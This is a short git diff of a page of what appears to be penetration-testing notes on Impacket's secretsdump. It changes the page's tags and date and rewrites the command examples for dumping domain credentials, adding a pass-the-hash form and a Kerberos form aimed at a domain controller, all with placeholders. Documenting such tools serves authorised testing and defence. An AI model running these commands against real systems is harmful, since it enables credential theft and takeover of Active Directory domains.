@@ -1,7 +1,7 @@
 ---
 title: "secretsdump"
-date: 2024-7-2
-tags: ["Sam", "Dcsync", "Impacket", "Domain Controller", "Credential Dumping", "Active Directory", "Windows", "Ntds.Dit", "Hive", "Nxc"]
+date: 2025-7-18
+tags: ["SAM", "SYSTEM", "SECURITY", "Dcsync", "Impacket", "secretsdump", "Domain Controller", "Credential Dumping", "Active Directory", "Windows", "Ntds.Dit", "Hive"]
 ---
 
 ### Convert ntds.dit to .sqlite
@@ -114,7 +114,12 @@ impacket-secretsdump '<USER>:<PASSWORD>@<TARGET>'
 
 ```console
 # NTLM
-sudo ntpdate -s <DC_IP> && impacket-secretsdump '<DOMAIN>/<USER>@<DC>' -hashes ':<HASH>' -k
+impacket-secretsdump '<DOMAIN>/<USER>@<DC>' -hashes ':<HASH>'
+```
+
+```console
+# Kerberos
+impacket-secretsdump -k -no-pass -dc-ip <DC_IP> <DC>
 ```
 
 {{< /tabcontent >}}
